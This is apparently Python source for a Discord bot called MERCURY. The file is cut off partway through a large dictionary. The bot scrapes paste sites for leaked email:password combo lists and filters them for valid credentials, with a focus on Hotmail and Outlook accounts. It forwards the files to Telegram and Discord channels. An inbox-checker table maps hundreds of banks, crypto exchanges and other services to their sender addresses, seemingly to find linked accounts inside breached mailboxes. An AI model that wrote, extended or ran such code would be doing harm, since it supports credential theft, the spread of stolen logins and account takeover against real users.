"""
MERCURY — Discord Bot
Scrapes Pasteview every 30 seconds, posts to 3 Discord channels + Telegram.
"""

import asyncio
import io
import json
import logging
import os
import random
import re
import time
from datetime import datetime, timezone
from pathlib import Path

import aiohttp
import concurrent.futures
import uuid
import zipfile

import discord
from discord.ext import commands, tasks
from discord import app_commands
from playwright.async_api import async_playwright

# ─── CONFIG ──────────────────────────────────────────────────────────────────
DISCORD_TOKEN      = os.environ["DISCORD_TOKEN"]
TELEGRAM_TOKEN     = os.environ["TELEGRAM_TOKEN"]
TELEGRAM_CHAT        = os.environ["TELEGRAM_CHAT"]
TELEGRAM_PUBLIC_CHAT  = os.environ["TELEGRAM_PUBLIC_CHAT"]
TELEGRAM_PUBLIC_CHAT2 = os.environ["TELEGRAM_PUBLIC_CHAT2"]
OWNER_ID           = int(os.environ["OWNER_ID"])

CHECK_INTERVAL   = 30
CHECKER_THREADS  = 50
MS_DOMAINS = {"hotmail.com", "hotmail.co.uk", "hotmail.fr", "hotmail.de", "hotmail.it",
              "hotmail.es", "hotmail.nl", "hotmail.be", "hotmail.se", "hotmail.no",
              "hotmail.dk", "hotmail.fi", "hotmail.pt", "hotmail.com.ar", "hotmail.com.br",
              "outlook.com", "outlook.fr", "outlook.de", "outlook.es", "outlook.co.uk",
              "live.com", "live.co.uk", "live.fr", "live.de", "live.nl",
              "msn.com"}
PAGES_TO_SCAN    = 5
ARCHIVE_URL      = "https://pasteview.com/paste-archive"
PASTEDPW_URL     = "https://pasted.pw/recent.php"
SEEN_FILE        = "seen_urls.json"
EMPTY_SCAN_ALERT = 10
KEYWORDS         = ["hotmail", "hits", "mixed"]
BLACKLIST        = ["omegle", "teens", "bro", "sis", "sister", "brother", "incest", "minor", "underage"]

# ─── LOGGING ─────────────────────────────────────────────────────────────────
logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [%(levelname)s] %(message)s",
    datefmt="%H:%M:%S",
)
log = logging.getLogger("mercury")

# ─── STATE ───────────────────────────────────────────────────────────────────
start_time = time.time()
stats      = {"total_pastes": 0, "total_combos": 0, "scans": 0, "empty_scans": 0}
scan_lock  = asyncio.Lock()

private_post_count = 0  # counts private channel posts, public update every 10
recent_filenames   = []  # tracks last 10 posted filenames for public update

# ─── FEATURE TOGGLES ─────────────────────────────────────────────────────────
toggles = {
    "scanning":        True,   # master on/off for scanning
    "telegram":        True,   # post to private telegram
    "telegram_public": True,   # post update message to public telegram
    "owner_dm":        True,   # DM owner on new file
}

def load_seen() -> set:
    if Path(SEEN_FILE).exists():
        try:
            with open(SEEN_FILE) as f:
                return set(json.load(f))
        except Exception:
            pass
    return set()

def save_seen(seen: set):
    try:
        with open(SEEN_FILE, "w") as f:
            json.dump(list(seen), f)
    except Exception as e:
        log.error(f"Failed to save seen URLs: {e}")

posted_urls: set = load_seen()

# ─── CREDENTIAL VALIDATION ───────────────────────────────────────────────────
EMOJI_RE = re.compile(
    "["
    u"\U0001F600-\U0001F64F"
    u"\U0001F300-\U0001F5FF"
    u"\U0001F680-\U0001F9FF"
    u"\U00002600-\U000027BF"
    u"\U0001FA00-\U0001FA6F"
    u"\U0001FA70-\U0001FAFF"
    u"\U00002702-\U000027B0"
    "]+", flags=re.UNICODE
)
JUNK_DOMAINS   = ("t.me", "telegram.me", "discord.gg", "http://", "https://")
VALID_EMAIL_RE = re.compile(r"^[a-zA-Z0-9._%+\-]+@[a-zA-Z0-9.\-]+\.[a-zA-Z]{2,}$")

def is_valid_combo(line: str) -> bool:
    if not line or len(line) > 200 or "|" in line:
        return False
    if EMOJI_RE.search(line) or any(d in line.lower() for d in JUNK_DOMAINS):
        return False
    if ":" not in line:
        return False
    parts = line.split(":", 1)
    email, password = parts[0].strip(), parts[1].strip()
    if not password or len(password) < 3:
        return False
    return bool(VALID_EMAIL_RE.match(email))

def extract_credentials(raw: str) -> list[str]:
    seen, lines = set(), []
    for line in raw.splitlines():
        line = line.strip()
        if line and is_valid_combo(line) and line not in seen:
            seen.add(line)
            lines.append(line)
    return lines


# ─── TELEGRAM ────────────────────────────────────────────────────────────────
async def send_telegram_file(text, filename: str):
    url  = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendDocument"
    data = aiohttp.FormData()
    data.add_field("chat_id", TELEGRAM_CHAT)
    content = text.encode() if isinstance(text, str) else text
    data.add_field("document", content, filename=filename, content_type="application/octet-stream")
    try:
        async with aiohttp.ClientSession() as session:
            async with session.post(url, data=data) as resp:
                if resp.status != 200:
                    body = await resp.text()
                    log.error(f"Telegram API error {resp.status}: {body}")
                else:
                    log.info("Posted to Telegram")
    except Exception as e:
        log.error(f"Failed to send to Telegram: {e}")

# ─── BOT ─────────────────────────────────────────────────────────────────────
intents = discord.Intents.default()
bot  = commands.Bot(command_prefix="!", intents=intents)
tree = bot.tree

async def extract_raw(page, url: str) -> str:
    for attempt in range(2):
        try:
            await page.goto(url, wait_until="networkidle", timeout=15000)
            await page.wait_for_timeout(1500)

            raw = await page.evaluate("""
                () => {
                    if (window.ace) {
                        const editors = document.querySelectorAll('.ace_editor');
                        for (let ed of editors) {
                            try { const v = ace.edit(ed).getValue(); if (v && v.trim()) return v; } catch(e) {}
                        }
                    }
                    return null;
                }
            """)

            if not raw or not raw.strip():
                await page.evaluate("() => { const s = document.querySelector('.ace_scroller'); if (s) s.scrollTop = s.scrollHeight; }")
                await page.wait_for_timeout(800)
                lines = await page.query_selector_all("div.ace_line")
                raw   = "\n".join([(await l.text_content() or "").strip() for l in lines])

            if not raw or not raw.strip():
                pre = await page.query_selector("pre")
                if pre:
                    raw = await pre.text_content()

            if raw and raw.strip():
                return raw

        except Exception as e:
            log.error(f"Extract attempt {attempt+1} failed for {url}: {e}")
            if attempt == 0:
                await asyncio.sleep(2)

    return ""


# ─── INBOX CHECKER ───────────────────────────────────────────────────────────
INBOX_SERVICES = {
    # Social Media & Communication
    "Facebook": "security@facebookmail.com",
    "Instagram": "security@mail.instagram.com",
    "TikTok": "register@account.tiktok.com",
    "Twitter": "info@x.com",
    "LinkedIn": "messages-noreply@linkedin.com",
    "Snapchat": "no-reply@accounts.snapchat.com",
    "Discord": "noreply@discord.com",
    "Telegram": "security@telegram.org",
    "WhatsApp": "no-reply@whatsapp.com",
    "Reddit": "noreply@reddit.com",
    "Pinterest": "no-reply@pinterest.com",
    "Tumblr": "no-reply@tumblr.com",
    "WeChat": "noreply@wechat.com",
    "Viber": "noreply@viber.com",
    "Signal": "support@signal.org",
    "Mastodon": "notifications@mastodon.social",
    "Threads": "no-reply@threads.net",
    "Bluesky": "no-reply@bsky.app",
    "VK": "noreply@vk.com",
    "Twitch": "no-reply@twitch.tv",
    "YouTube": "noreply@youtube.com",
    "Vimeo": "noreply@vimeo.com",
    "Dailymotion": "noreply@dailymotion.com",
    "Clubhouse": "noreply@clubhouse.com",
    "BeReal": "noreply@bere.al",
    
    # Streaming & Entertainment
    "Netflix": "info@account.netflix.com",
    "Spotify": "no-reply@spotify.com",
    "Apple Music": "noreply@email.apple.com",
    "Amazon Music": "digital-no-reply@amazon.com",
    "Tidal": "support@tidal.com",
    "Deezer": "no-reply@deezer.com",
    "YouTube Music": "noreply@youtube.com",
    "SoundCloud": "noreply@soundcloud.com",
    "Pandora": "noreply@pandora.com",
    "Disney+": "DisneyPlus@mail.disneyplus.com",
    "Hulu": "hulu@email.hulu.com",
    "HBO Max": "HBO@emails.hbo.com",
    "Prime Video": "primevideo@amazon.com",
    "Paramount+": "noreply@paramount.com",
    "Peacock": "noreply@peacocktv.com",
    "Apple TV+": "noreply@email.apple.com",
    "Crunchyroll": "noreply@crunchyroll.com",
    "Funimation": "noreply@funimation.com",
    "Audible": "noreply@audible.com",
    "Kindle": "digital-no-reply@amazon.com",
    "Scribd": "noreply@scribd.com",
    
    # Gaming
    "Steam": "noreply@steampowered.com",
    "Epic Games": "help@acct.epicgames.com",
    "Xbox": "xboxreps@engage.xbox.com",
    "PlayStation": "reply@txn-email.playstation.com",
    "Nintendo": "noreply@ccg.nintendo.com",
    "Battle.net": "noreply@blizzard.com",
    "Origin": "noreply@e.ea.com",
    "GOG": "noreply@gog.com",
    "Ubisoft": "noreply@ubisoft.com",
    "Riot Games": "noreply@riotgames.com",
    "Roblox": "info@roblox.com",
    "Minecraft": "noreply@mojang.com",
    "Fortnite": "help@acct.epicgames.com",
    "League of Legends": "noreply@riotgames.com",
    "Valorant": "noreply@riotgames.com",
    "Rockstar Games": "noreply@rockstargames.com",
    "Activision": "noreply@activision.com",
    "Bethesda": "noreply@bethesda.net",
    "Square Enix": "noreply@sqex.to",
    "Razer": "noreply@razer.com",
    
    # E-commerce & Retail
    "Amazon": "auto-confirm@amazon.com",
    "eBay": "ebay@ebay.com",
    "Etsy": "noreply@etsy.com",
    "AliExpress": "noreply@post.aliexpress.com",
    "Walmart": "noreply@walmart.com",
    "Target": "noreply@target.com",
    "Best Buy": "BestBuyInfo@emailinfo.bestbuy.com",
    "Costco": "noreply@costco.com",
    "IKEA": "noreply@ikea.com",
    "Home Depot": "noreply@homedepot.com",
    "Lowe's": "noreply@lowes.com",
    "Wayfair": "noreply@wayfair.com",
    "Overstock": "noreply@overstock.com",
    "Newegg": "info@newegg.com",
    "Zappos": "noreply@zappos.com",
    "ASOS": "noreply@asos.com",
    "Shein": "noreply@shein.com",
    "Zara": "noreply@zara.com",
    "H&M": "noreply@hm.com",
    "Nike": "noreply@nike.com",
    "Adidas": "noreply@adidas.com",
    "Sephora": "noreply@sephora.com",
    "Ulta": "noreply@ulta.com",
    "Macy's": "macys@e.macys.com",
    "Nordstrom": "noreply@nordstrom.com",
    "REI": "noreply@rei.com",
    "Alibaba": "noreply@alibaba.com",
    "Wish": "noreply@wish.com",
    "Temu": "noreply@temu.com",
    
    # Finance & Banking
    "PayPal": "service@paypal.com",
    "Venmo": "venmo@venmo.com",
    "Cash App": "cash@square.com",
    "Zelle": "noreply@zellepay.com",
    "Stripe": "noreply@stripe.com",
    "Square": "noreply@square.com",
    "Revolut": "noreply@revolut.com",
    "Chime": "noreply@chime.com",
    "Chase": "no.reply.alerts@chase.com",
    "Bank of America": "noreply@bofa.com",
    "Wells Fargo": "noreply@wellsfargo.com",
    "Citibank": "noreply@citi.com",
    "Capital One": "noreply@capitalone.com",
    "Discover": "noreply@discover.com",
    "American Express": "noreply@welcome.aexp.com",
    "HSBC": "noreply@hsbc.com",
    "Barclays": "noreply@barclays.com",
    "N26": "noreply@n26.com",
    "Wise": "noreply@wise.com",
    "Robinhood": "noreply@robinhood.com",
    "Coinbase": "no-reply@coinbase.com",
    "Binance": "do-not-reply@ses.binance.com",
    "Kraken": "noreply@kraken.com",
    "Gemini": "noreply@gemini.com",
    "Crypto.com": "no-reply@crypto.com",
    "Blockchain.com": "noreply@blockchain.info",
    "MetaMask": "noreply@metamask.io",
    "Trust Wallet": "noreply@trustwallet.com",
    "Ledger": "noreply@ledger.com",
    
    # Cloud Storage & Productivity
    "Google": "noreply@google.com",
    "Gmail": "noreply@google.com",
    "Google Drive": "noreply-drive@google.com",
    "Dropbox": "no-reply@dropbox.com",
    "OneDrive": "noreply@email.onedrive.com",
    "iCloud": "noreply@email.apple.com",
    "Box": "noreply@box.com",
    "pCloud": "noreply@pcloud.com",
    "MEGA": "noreply@mega.nz",
    "Microsoft": "noreply@email.microsoft.com",
    "Office 365": "noreply@email.microsoft.com",
    "Outlook": "noreply@outlook.com",
    "Notion": "team@makenotion.com",
    "Evernote": "noreply@evernote.com",
    "Trello": "noreply@trello.com",
    "Asana": "noreply@asana.com",
    "Monday.com": "noreply@monday.com",
    "Slack": "feedback@slack.com",
    "Microsoft Teams": "noreply@email.teams.microsoft.com",
    "Zoom": "no-reply@zoom.us",
    "Google Meet": "noreply@google.com",
    "Webex": "noreply@webex.com",
    "Calendly": "noreply@calendly.com",
    "DocuSign": "noreply@docusign.net",
    "Adobe Sign": "noreply@adobe.com",
    
    # VPN & Security
    "NordVPN": "no-reply@nordvpn.com",
    "ExpressVPN": "noreply@expressvpn.com",
    "Surfshark": "noreply@surfshark.com",
    "CyberGhost": "noreply@cyberghostvpn.com",
    "Private Internet Access": "noreply@privateinternetaccess.com",
    "ProtonVPN": "noreply@protonvpn.com",
    "IPVanish": "noreply@ipvanish.com",
    "TunnelBear": "noreply@tunnelbear.com",
    "Norton": "noreply@norton.com",
    "McAfee": "noreply@mcafee.com",
    "Kaspersky": "noreply@kaspersky.com",
    "Bitdefender": "noreply@bitdefender.com",
    "Avast": "noreply@avast.com",
    "AVG": "noreply@avg.com",
    "Malwarebytes": "noreply@malwarebytes.com",
    "1Password": "noreply@1password.com",
    "LastPass": "noreply@lastpass.com",
    "Dashlane": "noreply@dashlane.com",
    "Bitwarden": "noreply@bitwarden.com",
    "Keeper": "noreply@keepersecurity.com",
    
    # Email Services
    "ProtonMail": "noreply@protonmail.com",
    "Tutanota": "noreply@tutanota.com",
    "Mailchimp": "noreply@mailchimp.com",
    "SendGrid": "noreply@sendgrid.com",
    "Constant Contact": "noreply@constantcontact.com",
    "AWeber": "noreply@aweber.com",
    "ConvertKit": "noreply@convertkit.com",
    "GetResponse": "noreply@getresponse.com",
    "ActiveCampaign": "noreply@activecampaign.com",
    "HubSpot": "noreply@hubspot.com",
    "Zoho Mail": "noreply@zohomail.com",
    "FastMail": "noreply@fastmail.com",
    "GMX": "noreply@gmx.com",
    "Yahoo Mail": "noreply@yahoo.com",
    "AOL": "noreply@aol.com",
    
    # Transportation & Travel
    "Uber": "no-reply@uber.com",
    "Lyft": "noreply@lyft.com",
    "DoorDash": "no-reply@doordash.com",
    "Uber Eats": "no-reply@ubereats.com",
    "Grubhub": "noreply@grubhub.com",
    "Postmates": "noreply@postmates.com",
    "Instacart": "noreply@instacart.com",
    "Airbnb": "noreply@airbnb.com",
    "Booking.com": "noreply@booking.com",
    "Expedia": "noreply@expedia.com",
    "Hotels.com": "noreply@hotels.com",
    "Vrbo": "noreply@vrbo.com",
    "TripAdvisor": "noreply@tripadvisor.com",
    "Kayak": "noreply@kayak.com",
    "Skyscanner": "noreply@skyscanner.com",
    "Delta": "noreply@delta.com",
    "United Airlines": "noreply@united.com",
    "American Airlines": "noreply@aa.com",
    "Southwest": "noreply@southwest.com",
    "JetBlue": "noreply@jetblue.com",
    "British Airways": "noreply@britishairways.com",
    "Lufthansa": "noreply@lufthansa.com",
    "Emirates": "noreply@emirates.com",
    "Air France": "noreply@airfrance.com",
    "KLM": "noreply@klm.com",
    "Ryanair": "noreply@ryanair.com",
    "EasyJet": "noreply@easyjet.com",
    "Amtrak": "noreply@amtrak.com",
    "Greyhound": "noreply@greyhound.com",
    "Hertz": "noreply@hertz.com",
    "Enterprise": "noreply@enterprise.com",
    "Budget": "noreply@budget.com",
    "Avis": "noreply@avis.com",
    
    # Food Delivery & Restaurants
    "McDonald's": "noreply@mcdonalds.com",
    "Starbucks": "noreply@starbucks.com",
    "Chipotle": "noreply@chipotle.com",
    "Domino's": "noreply@dominos.com",
    "Pizza Hut": "noreply@pizzahut.com",
    "Subway": "noreply@subway.com",
    "KFC": "noreply@kfc.com",
    "Taco Bell": "noreply@tacobell.com",
    "Wendy's": "noreply@wendys.com",
    "Burger King": "noreply@burgerking.com",
    "Panera Bread": "noreply@panerabread.com",
    "Chick-fil-A": "noreply@chick-fil-a.com",
    
    # Education & Learning
    "Coursera": "noreply@coursera.org",
    "Udemy": "noreply@udemy.com",
    "edX": "noreply@edx.org",
    "Khan Academy": "noreply@khanacademy.org",
    "LinkedIn Learning": "noreply@linkedin.com",
    "Skillshare": "noreply@skillshare.com",
    "Pluralsight": "noreply@pluralsight.com",
    "DataCamp": "noreply@datacamp.com",
    "Codecademy": "noreply@codecademy.com",
    "Duolingo": "hello@duolingo.com",
    "Babbel": "noreply@babbel.com",
    "Rosetta Stone": "noreply@rosettastone.com",
    "MasterClass": "noreply@masterclass.com",
    "Brilliant": "noreply@brilliant.org",
    "Quizlet": "noreply@quizlet.com",
    "Chegg": "noreply@chegg.com",
    "Grammarly": "noreply@grammarly.com",
    "Turnitin": "noreply@turnitin.com",
    "Canvas": "noreply@canvas.instructure.com",
    "Blackboard": "noreply@blackboard.com",
    "Google Classroom": "noreply@classroom.google.com",
    
    # Health & Fitness
    "MyFitnessPal": "noreply@myfitnesspal.com",
    "Fitbit": "noreply@fitbit.com",
    "Strava": "noreply@strava.com",
    "Peloton": "noreply@onepeloton.com",
    "Nike Training Club": "noreply@nike.com",
    "Calm": "noreply@calm.com",
    "Headspace": "noreply@headspace.com",
    "Apple Health": "noreply@apple.com",
    "Samsung Health": "noreply@samsung.com",
    "Garmin": "noreply@garmin.com",
    "Whoop": "noreply@whoop.com",
    "Noom": "noreply@noom.com",
    "WW": "noreply@weightwatchers.com",
    "Teladoc": "noreply@teladoc.com",
    "GoodRx": "noreply@goodrx.com",
    "Zocdoc": "noreply@zocdoc.com",
    "CVS": "noreply@cvs.com",
    "Walgreens": "noreply@walgreens.com",
    
    # News & Media
    "New York Times": "noreply@nytimes.com",
    "Washington Post": "noreply@washingtonpost.com",
    "Wall Street Journal": "noreply@wsj.com",
    "CNN": "noreply@cnn.com",
    "BBC": "noreply@bbc.com",
    "The Guardian": "noreply@theguardian.com",
    "Reuters": "noreply@reuters.com",
    "Bloomberg": "noreply@bloomberg.com",
    "Forbes": "noreply@forbes.com",
    "Medium": "noreply@medium.com",
    "Substack": "noreply@substack.com",
    "Patreon": "noreply@patreon.com",
    "Ko-fi": "noreply@ko-fi.com",
    "Pocket": "noreply@getpocket.com",
    "Feedly": "noreply@feedly.com",
    "Flipboard": "noreply@flipboard.com",
    
    # Dating & Social
    "Tinder": "noreply@gotinder.com",
    "Bumble": "noreply@team.bumble.com",
    "Hinge": "noreply@hinge.co",
    "Match.com": "noreply@match.com",
    "eHarmony": "noreply@eharmony.com",
    "OkCupid": "noreply@okcupid.com",
    "Plenty of Fish": "noreply@pof.com",
    "Grindr": "noreply@grindr.com",
    "Coffee Meets Bagel": "noreply@coffeemeetsbagel.com",
    
    # Developer & Tech Services
    "GitHub": "noreply@github.com",
    "GitLab": "noreply@gitlab.com",
    "Bitbucket": "noreply@bitbucket.org",
    "Stack Overflow": "noreply@stackoverflow.com",
    "Heroku": "noreply@heroku.com",
    "DigitalOcean": "noreply@digitalocean.com",
    "AWS": "no-reply@amazonaws.com",
    "Azure": "noreply@microsoft.com",
    "Google Cloud": "noreply@google.com",
    "Vercel": "noreply@vercel.com",
    "Netlify": "noreply@netlify.com",
    "Firebase": "noreply@firebase.com",
    "npm": "noreply@npmjs.com",
    "PyPI": "noreply@pypi.org",
    "Docker": "noreply@docker.com",
    "Kubernetes": "noreply@kubernetes.io",
    "Jenkins": "noreply@jenkins.io",
    "CircleCI": "noreply@circleci.com",
    "Travis CI": "noreply@travis-ci.org",
    "Jira": "noreply@atlassian.com",
    "Confluence": "noreply@atlassian.com",
    "Bitbucket": "noreply@atlassian.com",
    "Sentry": "noreply@sentry.io",
    "New Relic": "noreply@newrelic.com",
    "Datadog": "noreply@datadoghq.com",
    "PagerDuty": "noreply@pagerduty.com",
    "Splunk": "noreply@splunk.com",
    "Grafana": "noreply@grafana.com",
    
    # Domain & Hosting
    "GoDaddy": "noreply@godaddy.com",
    "Namecheap": "noreply@namecheap.com",
    "Bluehost": "noreply@bluehost.com",
    "HostGator": "noreply@hostgator.com",
    "DreamHost": "noreply@dreamhost.com",
    "SiteGround": "noreply@siteground.com",
    "A2 Hosting": "noreply@a2hosting.com",
    "Cloudflare": "noreply@cloudflare.com",
    "Wix": "noreply@wix.com",
    "Squarespace": "noreply@squarespace.com",
    "WordPress.com": "noreply@wordpress.com",
    "Shopify": "noreply@shopify.com",
    "BigCommerce": "noreply@bigcommerce.com",
    "WooCommerce": "noreply@woocommerce.com",
    "Magento": "noreply@magento.com",
    
    # Job & Career
    "Indeed": "noreply@indeed.com",
    "ZipRecruiter": "noreply@ziprecruiter.com",
    "Glassdoor": "noreply@glassdoor.com",
    "Monster": "noreply@monster.com",
    "CareerBuilder": "noreply@careerbuilder.com",
    "Handshake": "noreply@joinhandshake.com",
    "AngelList": "noreply@angel.co",
    "Hired": "noreply@hired.com",
    "Dice": "noreply@dice.com",
    "FlexJobs": "noreply@flexjobs.com",
    "Remote.co": "noreply@remote.co",
    "We Work Remotely": "noreply@weworkremotely.com",
    
    # Real Estate
    "Zillow": "noreply@zillow.com",
    "Trulia": "noreply@trulia.com",
    "Realtor.com": "noreply@realtor.com",
    "Redfin": "noreply@redfin.com",
    "Apartments.com": "noreply@apartments.com",
    "Rent.com": "noreply@rent.com",
    "Craigslist": "noreply@craigslist.org",
    
    # Insurance
    "Geico": "noreply@geico.com",
    "State Farm": "noreply@statefarm.com",
    "Progressive": "noreply@progressive.com",
    "Allstate": "noreply@allstate.com",
    "Farmers": "noreply@farmers.com",
    "Liberty Mutual": "noreply@libertymutual.com",
    "USAA": "noreply@usaa.com",
    "Nationwide": "noreply@nationwide.com",
    "Travelers": "noreply@travelers.com",
    "Lemonade": "noreply@lemonade.com",
    "Root": "noreply@root.com",
    "Metromile": "noreply@metromile.com",
    
    # Government & Public Services
    "IRS": "noreply@irs.gov",
    "USPS": "noreply@usps.com",
    "FedEx": "noreply@fedex.com",
    "UPS": "noreply@ups.com",
    "DHL": "noreply@dhl.com",
    "SSA": "noreply@ssa.gov",
    "DMV": "noreply@dmv.org",
    "USA.gov": "noreply@usa.gov",
    
    # Telecommunications
    "Verizon": "noreply@verizon.com",
    "AT&T": "noreply@att.com",
    "T-Mobile": "noreply@t-mobile.com",
    "Sprint": "noreply@sprint.com",
    "Comcast": "noreply@comcast.net",
    "Xfinity": "noreply@xfinity.com",
    "Spectrum": "noreply@spectrum.com",
    "Cox": "noreply@cox.com",
    "CenturyLink": "noreply@centurylink.com",
    "Frontier": "noreply@frontier.com",
    "Google Fi": "noreply@google.com",
    "Mint Mobile": "noreply@mintmobile.com",
    "Cricket": "noreply@cricketwireless.com",
    "Boost Mobile": "noreply@boostmobile.com",
    "Metro by T-Mobile": "noreply@metrobytmobile.com",
    
    # Utilities
    "Tesla": "noreply@tesla.com",
    "Duke Energy": "noreply@duke-energy.com",
    "PG&E": "noreply@pge.com",
    "ConEd": "noreply@coned.com",
    "National Grid": "noreply@nationalgrid.com",
    
    # Loyalty & Rewards
    "American Express Rewards": "noreply@welcome.aexp.com",
    "Chase Ultimate Rewards": "noreply@chase.com",
    "Hilton Honors": "noreply@hilton.com",
    "Marriott Bonvoy": "noreply@marriott.com",
    "Delta SkyMiles": "noreply@delta.com",
    "United MileagePlus": "noreply@united.com",
    "American AAdvantage": "noreply@aa.com",
    "Southwest Rapid Rewards": "noreply@southwest.com",
    "Hyatt": "noreply@hyatt.com",
    "IHG": "noreply@ihg.com",
    "Best Western": "noreply@bestwestern.com",
    
    # Charity & Nonprofit
    "Red Cross": "noreply@redcross.org",
    "UNICEF": "noreply@unicef.org",
    "World Wildlife Fund": "noreply@wwf.org",
    "Doctors Without Borders": "noreply@doctorswithoutborders.org",
    "Salvation Army": "noreply@salvationarmy.org",
    "Habitat for Humanity": "noreply@habitat.org",
    "Goodwill": "noreply@goodwill.org",
    "United Way": "noreply@unitedway.org",
    "ASPCA": "noreply@aspca.org",
    "Wikipedia": "noreply@wikimediafoundation.org",
    
    # Events & Tickets
    "Eventbrite": "noreply@eventbrite.com",
    "Ticketmaster": "noreply@ticketmaster.com",
    "StubHub": "noreply@stubhub.com",
    "SeatGeek": "noreply@seatgeek.com",
    "Vivid Seats": "noreply@vividseats.com",
    "Live Nation": "noreply@livenation.com",
    "AXS": "noreply@axs.com",
    "Universe": "noreply@universe.com",
    
    # Photo & Design
    "Adobe Creative Cloud": "noreply@adobe.com",
    "Photoshop": "noreply@adobe.com",
    "Lightroom": "noreply@adobe.com",
    "Illustrator": "noreply@adobe.com",
    "Canva": "noreply@canva.com",
    "Figma": "noreply@figma.com",
    "Sketch": "noreply@sketch.com",
    "InVision": "noreply@invisionapp.com",
    "Shutterstock": "noreply@shutterstock.com",
    "Getty Images": "noreply@gettyimages.com",
    "Unsplash": "noreply@unsplash.com",
    "Pexels": "noreply@pexels.com",
    "500px": "noreply@500px.com",
    "Flickr": "noreply@flickr.com",
    "SmugMug": "noreply@smugmug.com",
    "Pixieset": "noreply@pixieset.com",
    
    # AI & ML Services
    "OpenAI": "noreply@openai.com",
    "Anthropic": "noreply@anthropic.com",
    "Cohere": "noreply@cohere.ai",
    "Hugging Face": "noreply@huggingface.co",
    "Replicate": "noreply@replicate.com",
    "Midjourney": "noreply@midjourney.com",
    "Stable Diffusion": "noreply@stability.ai",
    "RunwayML": "noreply@runwayml.com",
    "Jasper": "noreply@jasper.ai",
    "Copy.ai": "noreply@copy.ai",
    "Writesonic": "noreply@writesonic.com",
    
    # CRM & Marketing
    "Salesforce": "noreply@salesforce.com",
    "Zendesk": "noreply@zendesk.com",
    "Intercom": "noreply@intercom.io",
    "Freshdesk": "noreply@freshdesk.com",
    "Help Scout": "noreply@helpscout.com",
    "Pipedrive": "noreply@pipedrive.com",
    "Close": "noreply@close.com",
    "Copper": "noreply@copper.com",
    "Zoho CRM": "noreply@zoho.com",
    "SugarCRM": "noreply@sugarcrm.com",
    
    # Analytics
    "Google Analytics": "noreply@google.com",
    "Mixpanel": "noreply@mixpanel.com",
    "Amplitude": "noreply@amplitude.com",
    "Segment": "noreply@segment.com",
    "Heap": "noreply@heap.io",
    "Hotjar": "noreply@hotjar.com",
    "FullStory": "noreply@fullstory.com",
    "Crazy Egg": "noreply@crazyegg.com",
    "Optimizely": "noreply@optimizely.com",
    "VWO": "noreply@vwo.com",
    
    # Project Management
    "Basecamp": "noreply@basecamp.com",
    "ClickUp": "noreply@clickup.com",
    "Wrike": "noreply@wrike.com",
    "Smartsheet": "noreply@smartsheet.com",
    "Airtable": "noreply@airtable.com",
    "Coda": "noreply@coda.io",
    "Linear": "noreply@linear.app",
    "Height": "noreply@height.app",
    "Shortcut": "noreply@shortcut.com",
    "Clubhouse": "noreply@clubhouse.io",
    
    # Communication Tools
    "Front": "noreply@frontapp.com",
    "Superhuman": "noreply@superhuman.com",
    "Spark": "noreply@sparkmailapp.com",
    "Mimestream": "noreply@mimestream.com",
    "Hey": "noreply@hey.com",
    "Loom": "noreply@loom.com",
    "Riverside": "noreply@riverside.fm",
    "Descript": "noreply@descript.com",
    "Otter.ai": "noreply@otter.ai",
    "Fireflies.ai": "noreply@fireflies.ai",
    
    # E-signatures
    "HelloSign": "noreply@hellosign.com",
    "PandaDoc": "noreply@pandadoc.com",
    "SignNow": "noreply@signnow.com",
    "SignRequest": "noreply@signrequest.com",
    "eSignLive": "noreply@esignlive.com",
    
    # Invoicing & Accounting
    "QuickBooks": "noreply@intuit.com",
    "FreshBooks": "noreply@freshbooks.com",
    "Xero": "noreply@xero.com",
    "Wave": "noreply@waveapps.com",
    "Zoho Books": "noreply@zoho.com",
    "Bench": "noreply@bench.co",
    "Expensify": "noreply@expensify.com",
    "Gusto": "noreply@gusto.com",
    "ADP": "noreply@adp.com",
    "Paychex": "noreply@paychex.com",
    
    # Legal Services
    "LegalZoom": "noreply@legalzoom.com",
    "Rocket Lawyer": "noreply@rocketlawyer.com",
    "Nolo": "noreply@nolo.com",
    "Clio": "noreply@clio.com",
    "MyCase": "noreply@mycase.com",
    
    # Pet Services
    "Chewy": "noreply@chewy.com",
    "Petco": "noreply@petco.com",
    "PetSmart": "noreply@petsmart.com",
    "Rover": "noreply@rover.com",
    "Wag": "noreply@wagwalking.com",
    
    # Home Services
    "Thumbtack": "noreply@thumbtack.com",
    "TaskRabbit": "noreply@taskrabbit.com",
    "Angi": "noreply@angi.com",
    "HomeAdvisor": "noreply@homeadvisor.com",
    "Handy": "noreply@handy.com",
    "Porch": "noreply@porch.com",
    
    # Automotive
    "Carvana": "noreply@carvana.com",
    "Vroom": "noreply@vroom.com",
    "CarMax": "noreply@carmax.com",
    "AutoTrader": "noreply@autotrader.com",
    "Cars.com": "noreply@cars.com",
    "Edmunds": "noreply@edmunds.com",
    "Kelley Blue Book": "noreply@kbb.com",
    "TrueCar": "noreply@truecar.com",
    
    # Print & Publishing
    "Blurb": "noreply@blurb.com",
    "Lulu": "noreply@lulu.com",
    "Vistaprint": "noreply@vistaprint.com",
    "Moo": "noreply@moo.com",
    "Printful": "noreply@printful.com",
    "Printify": "noreply@printify.com",
    "Redbubble": "noreply@redbubble.com",
    "Society6": "noreply@society6.com",
    "Zazzle": "noreply@zazzle.com",
    
    # Sports & Recreation
    "Peloton": "noreply@onepeloton.com",
    "ClassPass": "noreply@classpass.com",
    "Mindbody": "noreply@mindbodyonline.com",
    "Zwift": "noreply@zwift.com",
    "TrainingPeaks": "noreply@trainingpeaks.com",
    "MapMyRun": "noreply@mapmyfitness.com",
    "RunKeeper": "noreply@runkeeper.com",
    "AllTrails": "noreply@alltrails.com",
    "Komoot": "noreply@komoot.com",
    "Wikiloc": "noreply@wikiloc.com",
    
    # Subscription Boxes
    "Birchbox": "noreply@birchbox.com",
    "Ipsy": "noreply@ipsy.com",
    "FabFitFun": "noreply@fabfitfun.com",
    "HelloFresh": "noreply@hellofresh.com",
    "Blue Apron": "noreply@blueapron.com",
    "Home Chef": "noreply@homechef.com",
    "ButcherBox": "noreply@butcherbox.com",
    "Thrive Market": "noreply@thrivemarket.com",
    "Stitch Fix": "noreply@stitchfix.com",
    "Trunk Club": "noreply@trunkclub.com",
    
    # Wine & Spirits
    "Drizly": "noreply@drizly.com",
    "Vivino": "noreply@vivino.com",
    "Wine.com": "noreply@wine.com",
    "Naked Wines": "noreply@nakedwines.com",
    "Winc": "noreply@winc.com",
    
    # Hobbies & Collectibles
    "eBay Collectibles": "ebay@ebay.com",
